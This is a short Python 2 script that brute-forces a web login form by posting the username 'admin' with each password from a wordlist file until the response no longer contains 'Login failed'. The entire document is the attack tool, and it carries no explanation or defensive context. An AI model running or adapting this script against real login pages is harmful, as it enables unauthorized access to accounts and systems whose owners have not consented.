import requests

target_url = ""
data_dict = {"username":"admin","password":"","Login":"submit"}

with open("pw.list","r") as wordlist_file:
	i=1
	for line in wordlist_file:
		print i
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data=data_dict)
		i = i+1
		if "Login failed" not in response.content:
			print "[+] Got the Password ----> " + word
			exit()

print "[+] Reached end of line "
